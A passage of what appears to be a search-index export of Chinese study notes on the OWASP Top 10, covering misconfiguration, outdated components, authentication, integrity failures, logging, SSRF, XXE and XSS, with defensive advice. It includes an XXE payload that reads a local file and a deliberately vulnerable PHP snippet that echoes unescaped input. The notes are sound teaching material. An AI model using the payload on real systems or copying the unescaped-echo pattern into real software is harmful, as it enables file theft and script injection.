Misconfiguration\uff08\u5b89\u5168\u914d\u7f6e\u9519\u8bef\uff09","text":"<p>\u7b2c 5 \u4e0a\u5347\u81f3 \u7b2c 6\u3002</p> <p>90%\u7684\u5e94\u7528\u7a0b\u5e8f\u90fd\u7ecf\u8fc7\u4e86\u67d0\u79cd\u5f62\u5f0f\u7684\u9519\u8bef\u914d\u7f6e\u6d4b\u8bd5\uff0c\u968f\u7740\u8f6c\u5411\u9ad8\u5ea6\u53ef\u914d\u7f6e\u8f6f\u4ef6\u7684\u8d8b\u52bf\u4e0d\u53ef\u9006\uff0c\u770b\u5230\u8fd9\u4e00\u7c7b\u522b\u6392\u540d\u4e0a\u5347\u4e5f\u5c31\u4e0d\u8db3\u4e3a\u5947\u4e86\u3002\u6b64\u524d\u7248\u672c\u7684 XML \u5916\u90e8\u5b9e\u4f53\u6ce8\u5165\uff08XXE\uff09\u7c7b\u522b\u73b0\u5728\u4e5f\u88ab\u5408\u5e76\u4e3a\u8be5\u7c7b\u522b\u7684\u4e00\u90e8\u5206\u3002</p> <p>\u98ce\u9669\u8bf4\u660e</p> <ul> <li> <p>\u5e94\u7528\u7a0b\u5e8f\u6808\u7684\u4efb\u4f55\u90e8\u5206\u7f3a\u5c11\u9002\u5f53\u7684\u5b89\u5168\u52a0\u56fa\uff0c\u6216\u8005\u4e91\u670d\u52a1\u7684\u6743\u9650\u914d\u7f6e\u9519\u8bef</p> </li> <li> <p>\u5e94\u7528\u7a0b\u5e8f\u542f\u7528\u6216\u5b89\u88c5\u4e86\u4e0d\u5fc5\u8981\u7684\u529f\u80fd\uff08\u4f8b\u5982\uff1a\u4e0d\u5fc5\u8981\u7684\u7aef\u53e3\u3001\u670d\u52a1\u3001\u7f51\u9875\u3001\u8d26\u6237\u6216\u6743\u9650\uff09</p> </li> <li> <p>\u9ed8\u8ba4\u8d26\u6237\u548c\u5bc6\u7801\u4ecd\u7136\u53ef\u7528\u4e14\u6ca1\u6709\u66f4\u6539</p> </li> <li> <p>\u9519\u8bef\u5904\u7406\u673a\u5236\u5411\u7528\u6237\u7eb0\u6f0f\u5806\u6808\u4fe1\u606f\u6216\u5176\u4ed6\u5927\u91cf\u9519\u8bef\u4fe1\u606f</p> </li> <li> <p>\u5bf9\u4e8e\u5347\u7ea7\u7684\u7cfb\u7edf\uff0c\u6700\u65b0\u7684\u5b89\u5168\u7279\u6027\u88ab\u7981\u7528\u6216\u672a\u5b89\u5168\u914d\u7f6e</p> </li> <li> <p>\u5e94\u7528\u7a0b\u5e8f\u670d\u52a1\u5668\u3001\u5e94\u7528\u7a0b\u5e8f\u6846\u67b6\uff08\u5982\uff1aStruts\u3001Spring\u3001ASP\u3002net\uff09\u3001\u5e93\u6587\u4ef6\u3001\u6570\u636e\u5e93\u7b49\u6ca1\u6709\u8fdb\u884c\u5b89\u5168\u914d\u7f6e</p> </li> </ul> <p>\u5982\u4f55\u9632\u8303</p> <ul> <li> <p>\u5e94\u5b9e\u65bd\u5b89\u5168\u7684\u5b89\u88c5\u8fc7\u7a0b\uff0c\u5305\u62ec \u4e00\u4e2a\u53ef\u4ee5\u5feb\u901f\u4e14\u6613\u4e8e\u90e8\u7f72\u5728\u53e6\u4e00\u4e2a\u9501\u5b9a\u73af\u5883\u7684\u53ef\u91cd\u590d\u7684\u52a0\u56fa\u8fc7\u7a0b\u3002</p> </li> <li> <p>\u5f00\u53d1\u3001\u8d28\u91cf\u4fdd\u8bc1\u548c\u751f\u4ea7\u73af\u5883\u90fd\u5e94\u8be5\u8fdb\u884c\u76f8\u540c\u914d\u7f6e\uff0c\u5e76\u4e14\u5728\u6bcf\u4e2a\u73af\u5883\u4e2d\u4f7f\u7528\u4e0d\u540c\u7684\u5bc6\u7801\u3002</p> </li> <li> <p>\u8fd9\u4e2a\u8fc7\u7a0b\u5e94\u8be5\u662f\u81ea\u52a8\u5316\u7684\uff0c\u4ee5\u5c3d\u91cf\u51cf\u5c11\u5b89\u88c5\u4e00\u4e2a\u65b0\u5b89\u5168\u73af\u5883\u7684\u6d88\u8017</p> </li> <li> <p>\u642d\u5efa\u6700\u5c0f\u5316\u5e73\u53f0\uff0c\u8be5\u5e73\u53f0\u4e0d\u5305\u542b\u4efb\u4f55\u4e0d\u5fc5\u8981\u7684\u529f\u80fd\u3001\u7ec4\u4ef6\u3001\u6587\u6863\u548c\u5b9e\u4f8b\u3002</p> </li> <li> <p>\u79fb\u9664\u6216\u4e0d\u5b89\u88c5\u4e0d\u9002\u7528\u7684\u529f\u80fd\u548c\u6846\u67b6</p> </li> <li> <p>\u68c0\u67e5\u548c\u4fee\u590d\u5b89\u5168\u914d\u7f6e\u6765\u9002\u5e94\u6700\u65b0\u7684\u5b89\u5168\u8bf4\u660e\u3001\u66f4\u65b0\u548c\u8865\u4e01\uff0c\u5e76\u5c06\u4f5c\u4e3a\u66f4\u65b0\u7ba1\u7406\u8fc7\u7a0b\u7684\u4e00\u90e8\u5206</p> </li> <li> <p>\u4e00\u4e2a\u80fd\u5728\u7ec4\u4ef6\u548c\u7528\u6237\u95f4\u63d0\u4f9b\u6709\u6548\u7684\u5206\u79bb\u548c\u5b89\u5168\u6027\u7684\u5206\u6bb5\u5e94\u7528\u7a0b\u5e8f\u67b6\u6784</p> </li> </ul>"},{"location":"security/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/OWASP%20TOP%2010/#a06-vulnerable-and-outdated-component","title":"A06 Vulnerable and Outdated Component\uff08\u81ea\u5e26\u7f3a\u9677\u548c\u8fc7\u65f6\u7684\u7ec4\u4ef6\uff09","text":"<p>\u6b64\u524d\u540d\u4e3a\u201c\u4f7f\u7528\u5177\u6709\u5df2\u77e5\u6f0f\u6d1e\u7684\u7ec4\u4ef6\u201d\uff08Using Components with Known Vulnerabilities\uff09</p> <p>\u5982\u4f55\u9632\u8303</p> <ul> <li>\u79fb\u9664\u4e0d\u4f7f\u7528\u7684\u4f9d\u8d56\u3001\u4e0d\u9700\u8981\u7684\u529f\u80fd\u3001\u7ec4\u4ef6\u3001\u6587\u4ef6\u548c\u6587\u6863</li> <li>\u4ec5\u4ece\u5b98\u65b9\u6e20\u9053\u5b89\u5168\u7684\u83b7\u53d6\u7ec4\u4ef6\uff0c\u5e76\u4f7f\u7528\u524d\u9762\u673a\u5236\u6765\u964d\u4f4e\u7ec4\u4ef6\u88ab\u7be1\u6539\u6216\u52a0\u5165\u6076\u610f\u6f0f\u6d1e\u7684\u98ce\u9669 \u76d1\u63a7\u90a3\u4e9b\u4e0d\u518d\u7ef4\u62a4\u6216\u8005\u4e0d\u53d1\u5e03\u5b89\u5168\u8865\u4e01\u7684\u5e93\u548c\u7ec4\u4ef6\u3002\u5982\u679c\u4e0d\u80fd\u6253\u8865\u4e01\uff0c\u5c31\u8003\u8651\u90e8\u7f72\u865a\u62df\u8865\u4e01\u6765\u76d1\u63a7\u3001\u68c0\u67e5\u6216\u4fdd\u62a4</li> </ul>"},{"location":"security/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/OWASP%20TOP%2010/#a07-identification-and-authentication-failure","title":"A07 Identification and Authentication Failure \uff08\u8eab\u4efd\u8bc6\u522b\u548c\u8eab\u4efd\u9a8c\u8bc1\u9519\u8bef\uff09","text":"<p>\u6b64\u524d\u79f0\u4e3a\u201c\u8eab\u4efd\u9a8c\u8bc1\u5931\u6548\u201d\uff08Broken Authentication\uff09\u2014\u2014\u6392\u540d\u4ece\u6b64\u524d\u7684\u7b2c 2 \u4f4d\u964d\u5230\u4e86\u7b2c 7 \u4f4d\uff0c\u800c\u4e14\u8be5\u7c7b\u522b\u76ee\u524d\u5305\u542b\u66f4\u591a\u4e0e\u8bc6\u522b\u5931\u8d25\u76f8\u5173\u7684 CWE\u3002\u867d\u7136\u8be5\u7c7b\u522b\u4ecd\u7136\u4f4d\u5217 Top 10 \u699c\u5355\uff0c\u4f46\u6807\u51c6\u5316\u6846\u67b6\u7684\u53ef\u7528\u6027\u589e\u52a0\u4f3c\u4e4e\u6709\u52a9\u4e8e\u89e3\u51b3\u8fd9\u4e00\u95ee\u9898\u3002</p> <p>\u653b\u51fb\u573a\u666f\u6848\u4f8b</p> <ul> <li>\u60c5\u5883 1: \u4f7f\u7528\u5df2\u77e5\u5217\u8868\u5bc6\u7801\u7684\u649e\u5e93\u653b\u51fb \u662f\u4e00\u79cd\u5e38\u89c1\u7684\u653b\u51fb\u65b9\u5f0f\uff0c\u5047\u8bbe\u5e94\u7528\u7a0b\u5f0f\u6ca1\u6709\u5b9e\u65bd\u81ea\u52a8\u5316\u5a01\u80c1\u6216\u649e\u5e93\u653b\u51fb\u7684\u4fdd\u62a4\uff0c\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u5e94\u7528\u7a0b\u5f0f\u4f1a\u88ab\u5229\u7528\u4e3a\u5bc6\u7801\u9884\u62a5\u7684\u5de5\u5177\u6765\u5224\u65ad\u8ba4\u8bc1\u8d44\u8baf\u662f\u5426\u6709\u6548\u3002</li> <li>\u60c5\u5883 2:\u5927\u591a\u6570\u7684\u8ba4\u8bc1\u653b\u51fb\u662f\u56e0\u4e3a\u6301\u7eed\u7684\u4f7f\u7528\u5bc6\u7801\u4f5c\u4e3a\u552f\u4e00\u56e0\u7d20\uff0c\u6700\u4f73\u5b9e\u8df5\u3001\u5bc6\u7801\u8f6e\u6362\u3001\u4ee5\u53ca\u590d\u6742\u5ea6\u7684\u8981\u6c42\u4f1a\u9f13\u52b1\u7528\u6237\u4f7f\u7528\u548c\u91cd\u590d\u4f7f\u7528\u8106\u5f31\u7684\u5bc6\u7801\u3002\u5efa\u8bae\u7ec4\u7ec7\u6309\u7167 NIST 800-63 \u505c\u6b62\u8fd9\u4e9b\u505a\u6cd5\u5e76\u4f7f\u7528\u591a\u56e0\u7d20\u8ba4\u8bc1\u3002</li> <li>\u60c5\u5883 3: \u5e94\u7528\u7a0b\u5f0f\u7684\u4f1a\u8bdd\u8d85\u65f6\u6ca1\u6709\u88ab\u8bbe\u5b9a\u6b63\u786e\uff08\u8d85\u65f6\u540e\u4e0d\u80fd\u4ecd\u7136\u5904\u4e8e\u901a\u8fc7\u8ba4\u8bc1\u72b6\u6001\uff09\u3002\u4e00\u4e2a\u7528\u6237\u4f7f\u7528\u516c\u7528\u7535\u8111\u6765\u5b58\u53d6\u5e94\u7528\u7a0b\u5f0f\u65f6\uff0c\u7528\u6237\u6ca1\u6709\u9009\u62e9\"\u767b\u51fa\"\u800c\u662f\u7b80\u5355\u7684\u5173\u95ed\u6d4f\u89c8\u5668\u5206\u9875\u5c31\u79bb\u5f00\uff0c\u6b64\u65f6\u4e00\u4e2a\u653b\u51fb\u8005\u5728\u4e00\u5c0f\u65f6\u540e\u4f7f\u7528\u540c\u4e00\u4e2a\u6d4f\u89c8\u5668\uff0c\u524d\u4e00\u4e2a\u7528\u6237\u4ecd\u7136\u5904\u4e8e\u901a\u8fc7\u8ba4\u8bc1\u7684\u72b6\u6001\u3002</li> </ul> <p>\u5982\u4f55\u9632\u8303</p> <ul> <li>\u5b9e\u65bd\u5f31\u5bc6\u7801\u7684\u68c0\u67e5\uff0c\u5982\u6d4b\u8bd5\u65b0\u8bbe\u5b9a\u6216\u53d8\u66f4\u7684\u5bc6\u7801\u662f\u5426\u5b58\u5728\u4e8e\u524d 10000 \u4e2a\u6700\u5dee\u5bc6\u7801\u6e05\u5355</li> <li>\u5728\u53ef\u80fd\u7684\u60c5\u51b5\u4e0b\uff0c\u5b9e\u65bd\u591a\u56e0\u7d20\u8ba4\u8bc1\u6765\u9632\u6b62\u81ea\u52a8\u5316\u649e\u5e93\u653b\u51fb\uff0c\u66b4\u529b\u7834\u89e3\uff0c\u4ee5\u53ca\u906d\u7a83\u8ba4\u8bc1\u54a8\u8be2\u88ab\u91cd\u590d\u5229\u7528\u7684\u653b\u51fb</li> <li>\u4e0d\u8981\u4ea4\u4ed8\u6216\u90e8\u7f72\u4efb\u4f55\u9884\u8bbe\u7684\u8ba4\u8bc1\u51ed\u8bc1\uff0c\u7279\u522b\u662f\u7ba1\u7406\u8005</li> <li>\u9650\u5236\u6216\u589e\u52a0\u767b\u5165\u5931\u8d25\u5c1d\u8bd5\u7684\u5ef6\u8fdf</li> </ul>"},{"location":"security/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/OWASP%20TOP%2010/#a08-software-and-data-integrity-failure","title":"A08 Software and Data Integrity Failure\uff08\u8f6f\u4ef6\u548c\u6570\u636e\u5b8c\u6574\u6027\u6545\u969c\uff09","text":"<p>2021 \u5e74\u65b0\u589e\u7684\u4e00\u4e2a\u7c7b\u522b\uff0c\u4e3b\u8981\u5173\u6ce8\u7f3a\u4e4f\u5b8c\u6574\u6027\u9a8c\u8bc1\u60c5\u51b5\u4e0b\u505a\u51fa\u4e0e\u8f6f\u4ef6\u66f4\u65b0\u3001\u5173\u952e\u6570\u636e\u548c\u6301\u7eed\u96c6\u6210/\u6301\u7eed\u4ea4\u4ed8\uff08CI/CD\uff09\u6d41\u6c34\u7ebf\u76f8\u5173\u7684\u5404\u79cd\u5047\u8bbe\u3002CVE/CVSS \u6570\u636e\u6700\u9ad8\u52a0\u6743\u5f71\u54cd\u4e4b\u4e00\u6620\u5c04\u5230\u8be5\u7c7b\u522b\u4e2d\u7684 10 \u4e2a CWE\u3002\u6b64\u524d\u7248\u672c\u4e2d\u7684\u201c\u4e0d\u5b89\u5168\u53cd\u5e8f\u5217\u5316\u201d\uff08Insecure Deserialization\uff09\u7c7b\u522b\u5982\u4eca\u4e5f\u88ab\u5f52\u5165\u8fd9\u4e00\u66f4\u5927\u7c7b\u522b\u3002</p> <p>\u7269\u4ef6\u6216\u8d44\u6599\u7ecf\u7f16\u7801\u6216 \u5e8f\u5217\u5316\u5230\u4e00\u4e2a\u5bf9\u653b\u51fb\u8005\u53ef\u8bfb\u5199\u7684\u7ed3\u6784\u4e2d \u5c06 \u5bfc\u81f4\u4e0d\u5b89\u5168\u7684\u53cd\u5e8f\u5217\u5316\u3002\u53e6\u4e00\u79cd\u5f62\u5f0f\u5219\u662f\u5e94\u7528\u7a0b\u5f0f\u4f9d\u8d56\u6765\u81ea\u4e8e\u4e0d\u53d7\u4fe1\u4efb\u6765\u6e90\uff0c\u5178\u85cf\u5e93\u53ca\u5185\u5bb9\u9012\u9001\u7f51\u8def\u4e4b\u5916\u6302\uff0c\u51fd\u5f0f\u5e93\u6216\u6a21\u7ec4\u3002</p> <p>\u4e0d\u5b89\u5168\u7684\u6301\u7eed\u6027\u6574\u5408/\u90e8\u7f72(CI/CD)\u6d41\u7a0b\u5219\u4f1a\u9020\u6210\u6f5c\u5728\u7684\u672a\u7ecf\u6388\u6743\u5b58\u53d6\uff0c\u6076\u610f\u7a0b\u5f0f\u7801\u6216\u7cfb\u7edf\u7834\u574f\u3002</p> <p>\u6700\u540e\uff0c\u73b0\u5728\u8bb8\u591a\u5e94\u7528\u7a0b\u5f0f\u62e5\u6709\u81ea\u52a8\u66f4\u65b0\u529f\u80fd\uff0c\u4f46\u81ea\u52a8\u66f4\u65b0\u529f\u80fd\u5728\u7f3a\u4e4f\u5145\u8db3\u5b8c\u6574\u6027\u9a8c\u8bc1\u529f\u80fd\u65f6\u5c31\u4e0b\u8f7d\u5e76\u5b89\u88c5\u66f4\u65b0\u5230\u5904\u4e8e\u5b89\u5168\u72b6\u6001\u4e0b\u7684\u5e94\u7528\u7a0b\u5f0f\u3002\u653b\u51fb\u8005\u80fd\u4e0a\u4f20\u81ea\u5236\u66f4\u65b0\u6863\u6848\uff0c\u66f4\u65b0\u6863\u6848\u5c06\u4f20\u64ad\u5230\u6240\u6709\u5df2\u5b89\u88c5\u4e4b\u5e94\u7528\u7a0b\u5f0f\u5e76\u5728\u8fd9\u4e9b\u5e94\u7528\u7a0b\u5f0f\u4e0a\u6267\u884c\u3002 \u786e\u4fdd\u4e0d\u53d7\u4fe1\u4efb\u4e4b\u5ba2\u6237\u7aef\u4e0d\u4f1a\u6536\u5230\u672a\u7b7e\u7f72\u6216\u52a0\u5bc6\u4e4b\u5e8f\u5217\u5316\u8d44\u6599\u5e76\u5229\u7528\u5b8c\u6574\u6027\u68c0\u67e5\u6216\u6570\u4f4d\u7b7e\u7ae0\u6765\u4fa6\u6d4b\u7a9c\u6539\u6216\u91cd\u653e\u653b\u51fb\u3002</p> <p>\u5982\u4f55\u9632\u8303</p> <ul> <li>\u4f7f\u7528\u6570\u5b57\u7b7e\u540d\u6216\u7c7b\u4f3c\u673a\u5236\u6765\u9a8c\u8bc1\u8f6f\u4ef6\u6216\u6570\u636e\u6765\u81ea\u9884\u671f\u6765\u6e90\uff0c\u4e14\u672a\u88ab\u4fee\u6539\u3002</li> <li>\u786e\u4fdd\u5e93\u548c\u4f9d\u8d56\u9879\u76ee\uff0c\u5982: npm \u6216 Maven\uff0c\u6b63\u5728\u4f7f\u7528\u53d7\u4fe1\u4efb\u7684\u5b58\u50a8\u5e93\u3002\u5982\u679c\u60a8\u7684\u98ce\u9669\u8f83\u9ad8\uff0c\u8bf7\u8003\u8651\u6258\u7ba1\u4e00\u4e2a\u7ecf\u8fc7\u5ba1\u6838\u7684\u3001\u5185\u90e8\u5df2\u77e5\u5408\u683c\u7684\u5b58\u50a8\u5e93\u3002</li> <li>\u786e\u4fdd\u4f7f\u7528\u8f6f\u4ef6\u4f9b\u5e94\u94fe\u5b89\u5168\u5de5\u5177(\u5982:OWASP Dependency Check \u6216 OWASP CycloneDX)\u6765\u9a8c\u8bc1\u7ec4\u4ef6\u4e0d\u5305\u542b\u5df2\u77e5\u6f0f\u6d1e\u3002</li> <li>\u786e\u4fdd\u5bf9\u4ee3\u7801\u548c\u914d\u7f6e\u66f4\u6539\u8fdb\u884c\u5ba1\u6838\uff0c\u4ee5\u6700\u5927\u9650\u5ea6\u5730\u51cf\u5c11\u6076\u610f\u4ee3\u7801\u6216\u914d\u7f6e\u5f15\u5165\u8f6f\u4ef6\u7ba1\u9053\u7684\u53ef\u80fd\u6027\u3002</li> <li>\u786e\u4fdd\u60a8\u7684 CI/CD \u7ba1\u9053\u5177\u6709\u9002\u5f53\u7684\u9694\u79bb\u3001\u914d\u7f6e\u548c\u8bbf\u95ee\u63a7\u5236\uff0c\u4ee5\u786e\u4fdd\u4ee3\u7801\u5728\u6784\u5efa\u548c\u90e8\u7f72\u8fc7\u7a0b\u4e2d\u7684\u5b8c\u6574\u6027\u3002\u786e\u4fdd\u901a\u8fc7\u7279\u5b9a\u5f62\u5f0f\u7684\u5b8c\u6574\u6027\u68c0\u67e5\u6216\u6570\u5b57\u7b7e\u540d\u6765\u68c0\u6d4b\u5e8f\u5217\u5316\u6570\u636e\u662f\u5426\u5b58\u5728\u7be1\u6539\u6216\u91cd\u64ad\uff0c\u6240\u6709\u672a\u7b7e\u540d\u6216\u672a\u52a0\u5bc6\u7684\u5e8f\u5217\u5316\u6570\u636e\u4e0d\u4f1a\u53d1\u9001\u5230\u4e0d\u53d7\u4fe1\u4efb\u7684\u5ba2\u6237\u7aef\u3002</li> </ul>"},{"location":"security/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/OWASP%20TOP%2010/#a09-security-logging-and-monitoring-failure","title":"A09 Security Logging and Monitoring Failure\uff08\u5b89\u5168\u65e5\u5fd7\u4e0e\u76d1\u63a7\u6545\u969c\uff09","text":"<p>\u6b64\u524d\u540d\u4e3a\u201c\u65e5\u5fd7\u8bb0\u5f55\u548c\u76d1\u63a7\u4e0d\u8db3\u201d\uff08Insufficient Logging &amp; Monitoring\uff09</p> <p>\u786e\u4fdd\u65e5\u5fd7\u6570\u636e\u88ab\u6b63\u786e\u7f16\u7801\u52a0\u5bc6\uff0c\u4ee5\u9632\u6b62\u5bf9\u65e5\u5fd7\u6216\u76d1\u63a7\u7cfb\u7edf\u7684\u6ce8\u5165\u6216\u653b\u51fb\u3002</p> <p>TODO Log4j2</p>"},{"location":"security/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/OWASP%20TOP%2010/#a10-server-side-request-forgeryssrf","title":"\u91cd\u70b9\u4e09\uff1aA10 Server-Side Request Forgery\uff08\u670d\u52a1\u5668\u7aef\u8bf7\u6c42\u4f2a\u9020\uff0cSSRF\uff09","text":"<p>2021 \u5e74\u65b0\u589e\u7684\u7c7b\u522b</p> <p>\u4e00\u65e6 web \u5e94\u7528\u7a0b\u5e8f\u5728\u83b7\u53d6\u8fdc\u7a0b\u8d44\u6e90\u65f6\u6ca1\u6709\u9a8c\u8bc1\u7528\u6237\u63d0\u4f9b\u7684 URL\uff0c\u5c31\u4f1a\u51fa\u73b0 ssrf \u7f3a\u9677\u3002\u5b83\u5141\u8bb8\u653b\u51fb\u8005\u5f3a\u5236\u5e94\u7528\u7a0b\u5e8f\u53d1\u9001\u4e00\u4e2a\u7cbe\u5fc3\u6784\u9020\u7684\u8bf7\u6c42\u5230\u610f\u5916\u7684\u76ee\u7684\u5730\uff0c\u5373\u4f7f\u662f\u5728\u6709\u9632\u706b\u5899\uff0cVPN \u83b7\u5176\u4ed6\u7c7b\u578b\u7684\u7f51\u7edc\u8bbf\u95ee\u63a7\u5236\u5217\u8868\u4fdd\u62a4\u7684\u60c5\u51b5\u4e0b</p> <p></p> <p>\u5982\u4f55\u9632\u8303</p> <p>1\u3001\u8fc7\u6ee4\u8fd4\u56de\u7684\u4fe1\u606f\uff0c\u5982\u679c web \u5e94\u7528\u662f\u53bb\u83b7\u53d6\u67d0\u4e00\u79cd\u7c7b\u578b\u7684\u6587\u4ef6\u3002\u90a3\u4e48\u5728\u628a\u8fd4\u56de\u7ed3\u679c\u5c55\u793a\u7ed9\u7528\u6237\u4e4b\u524d\u5148\u9a8c\u8bc1\u8fd4\u56de\u7684\u4fe1\u606f\u662f\u5426\u7b26\u5408\u6807\u51c6\u3002</p> <p>2\u3001\u7edf\u4e00\u9519\u8bef\u4fe1\u606f\uff0c\u907f\u514d\u7528\u6237\u53ef\u4ee5\u6839\u636e\u9519\u8bef\u4fe1\u606f\u6765\u5224\u65ad\u8fdc\u7a0b\u670d\u52a1\u5668\u7684\u7aef\u53e3\u72b6\u6001\u3002</p> <p>3\u3001\u9650\u5236\u8bf7\u6c42\u7684\u7aef\u53e3\uff0c\u6bd4\u5982 80,443,8080,8090\u3002</p> <p>4\u3001\u7981\u6b62\u4e0d\u5e38\u7528\u7684\u534f\u8bae\uff0c\u4ec5\u4ec5\u5141\u8bb8 http \u548c https \u8bf7\u6c42\u3002\u53ef\u4ee5\u9632\u6b62\u7c7b\u4f3c\u4e8e file:///,gopher://,ftp://\u7b49\u5f15\u8d77\u7684\u95ee\u9898\u3002</p> <p>5\u3001\u4f7f\u7528 DNS \u7f13\u5b58\u6216\u8005 Host \u767d\u540d\u5355\u7684\u65b9\u5f0f\u3002</p>"},{"location":"security/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/OWASP%20TOP%2010/#owasp-top-10-2017","title":"OWASP TOP 10 2017","text":""},{"location":"security/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/OWASP%20TOP%2010/#a04-xml-external-entitiesxxexml","title":"A04 XML External Entities\uff0cXXE\uff08XML \u5916\u90e8\u5b9e\u4f53\uff09","text":"<p>XXE \u6f0f\u6d1e\u53d1\u751f\u5728\u5e94\u7528\u7a0b\u5e8f\u89e3\u6790 XML \u8f93\u5165\u65f6\uff0c\u6ca1\u6709\u7981\u6b62\u5916\u90e8\u5b9e\u4f53\u7684\u52a0\u8f7d\uff0c\u5bfc\u81f4\u53ef\u52a0\u8f7d\u6076\u610f\u5916\u90e8\u6587\u4ef6\u548c\u4ee3\u7801\uff0c\u9020\u6210\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u3001\u547d\u4ee4\u6267\u884c\u3001\u5185\u7f51\u7aef\u53e3\u626b\u63cf\u3001\u653b\u51fb\u5185\u7f51\u7f51\u7ad9\u3001\u53d1\u8d77 DoS \u653b\u51fb\u7b49\u5371\u5bb3\u3002</p> <p>\u9632\u6b62 XXE \u7684\u6700\u5b89\u5168\u65b9\u6cd5\u59cb\u7ec8\u662f\u5b8c\u5168\u7981\u7528 DTD\uff08\u5916\u90e8\u5b9e\u4f53\uff09\u3002</p> <pre><code> &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;   //xml\u7684\u58f0\u660e\n &lt;!DOCTYPE foo [\n &lt;!ELEMENT foo ANY &gt;\n &lt;!ENTITY xxe SYSTEM \"file://d:/1.txt\" &gt;\n ]&gt;                                      //DTD\u90e8\u5206\n&lt;x&gt;&amp;xxe;&lt;/x&gt;                          //xml\u90e8\u5206\n</code></pre> <p>DTD \u7684\u90e8\u5206\uff0c\u610f\u601d\u662f\u8bfb\u53d6 d \u76d8\u4e0a\u7684 1.txt \u6587\u4ef6\uff0c\u5f53\u7136\u5982\u679c\u662f\u8bfb\u53d6\u7528\u6237\u5bc6\u7801\u5462\uff1f\u6216\u8005\u4e5f\u53ef\u4ee5\u8fdb\u884c\u66f4\u591a\u5176\u4ed6\u7684\u5371\u9669\u64cd\u4f5c\u3002</p>"},{"location":"security/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/OWASP%20TOP%2010/#a07-cross-site-scriptingxss","title":"A07 \u91cd\u70b9\u56db\uff1aCross-Site Scripting\uff0cXSS\uff08\u8de8\u7ad9\u811a\u672c\u653b\u51fb\uff09","text":"<p>\u8de8\u7ad9\u811a\u672c\u653b\u51fb\uff08Cross Site Scripting\uff09\uff0c\u4e3a\u4e0d\u548c\u5c42\u53e0\u6837\u5f0f\u8868\uff08Cascading Style Sheets\uff0cCSS\uff09\u7684\u7f29\u5199\u6df7\u6dc6\uff0c\u6545\u5c06\u8de8\u7ad9\u811a\u672c\u653b\u51fb\u7f29\u5199\u4e3a XSS\u3002</p> <p>\u7531\u4e8e WEB \u5e94\u7528\u7a0b\u5e8f \u5bf9\u7528\u6237\u7684\u8f93\u5165\u8fc7\u6ee4\u4e0d\u8db3 \u800c\u4ea7\u751f\u7684\u3002\u653b\u51fb\u8005 \u5229\u7528\u7f51\u7ad9\u6f0f\u6d1e\u628a\u6076\u610f\u7684\u811a\u672c\u4ee3\u7801\u6ce8\u5165\u5230\u7f51\u9875\u4e2d\uff0c\u5f53\u5176\u4ed6\u7528\u6237\u6d4f\u89c8\u8fd9\u4e9b\u7f51\u9875\u65f6\uff0c\u5c31\u4f1a\u6267\u884c\u5176\u4e2d\u7684\u6076\u610f\u4ee3\u7801\uff0c\u5bf9\u53d7\u5bb3\u7528\u6237\u53ef\u80fd\u91c7\u53d6 Cookies \u8d44\u6599\u7a83\u53d6\u3001\u4f1a\u8bdd\u52ab\u6301\u3001\u9493\u9c7c\u6b3a\u9a97\u7b49\u5404\u79cd\u653b\u51fb\u3002</p> <p>XSS \u4e3b\u8981\u5206\u4e3a\u4e09\u7c7b\uff1a</p> <ul> <li>\u53cd\u5c04\u578b XSS\uff08\u540e\u7aef\uff09</li> <li>DOM XSS\uff08\u524d\u7aef\uff09</li> <li>\u6301\u4e45\u578b XSS</li> </ul> <p>\u53cd\u5c04\u578b XSS</p> <p>\u901a\u5e38\u6765\u8bf4\uff0c\u670d\u52a1\u7aef\u7684\u4ee3\u7801\u5b58\u5728 XSS \u6f0f\u6d1e\uff0c\u4f8b\u5982\uff1a</p> <pre><code>&lt;?php\n// Is there any input?\nif( array_key_exists( \"name\", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) {\n    // Feedback for end user\n    echo '&lt;pre&gt;Hello ' . $_GET[ 'name' ] . '&lt;/pre&gt;';\n}\n?&gt;\n</code></pre> <p>\u8be5\u4ee3\u7801\u76f4\u63a5\u4ece url \u53c2\u6570\u4e2d\u83b7\u53d6 <code>name</code> \u5b57\u6bb5\uff0c\u4f46\u5982\u679c <code>name</code> \u5b57\u6bb5\u662f\u7cbe\u5fc3\u6784\u9020\u7684\u653b\u51fb\u4ee3\u7801\u5462\uff1f\u5c31\u5f88\u5bb9\u6613\u653b\u51fb\u8005\u5229\u7528\u3002</p> <p>\u56e0\u6b64\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u7cbe\u5fc3\u6784\u9020\u653b\u51fb URL\uff0c\u4f46\u4ecd\u7136\u9700\u8981\u7528\u6237\u70b9\u51fb\u8be5 URL \u624d\u884c\uff0c\u56e0\u6b64\u901a\u5e38\u6765\u8bf4\u653b\u51fb\u8005\u901a\u8fc7\u7535\u5b50\u90ae\u4ef6\u7b49\u65b9\u5f0f\u7ed9\u522b\u4eba\u53d1\u9001\u5e26\u6709\u6076\u610f\u811a\u672c\u4ee3\u7801\u53c2\u6570\u7684 URL\uff0c\u670d\u52a1\u5668\u7aef\u89e3\u6790\u540e\u54cd\u5e94\uff0cXSS \u4ee3\u7801\u968f\u54cd\u5e94\u5185\u5bb9\u4e00\u8d77\u4f20\u56de\u7ed9\u6d4f\u89c8\u5668\uff0c\u6700\u540e\u6d4f\u89c8\u5668\u89e3\u6790\u6267\u884c XSS \u4ee3\u7801\u3002</p> <p>DOM XSS</p> <p>DOM-Based XSS \u662f\u57fa\u4e8e DOM \u6587\u6863\u5bf9\u8c61\u6a21\u578b\u7684\u4e00\u79cd\u6f0f\u6d1e\uff0c\u5ba2\u6237\u7aef\u7684\u811a\u672c\u7a0b\u5e8f\u53ef\u4ee5\u901a\u8fc7 DOM \u52a8\u6001\u5730\u68c0\u67e5\u548c\u4fee\u6539\u9875\u9762\u5185\u5bb9\uff0c\u5b83\u4e0d\u4f9d\u8d56\u4e8e\u670d\u52a1\u5668\u7aef\u7684\u6570\u636e\u3002</p> <p>Tom \u53d1\u73b0\u4e86 Victim.com 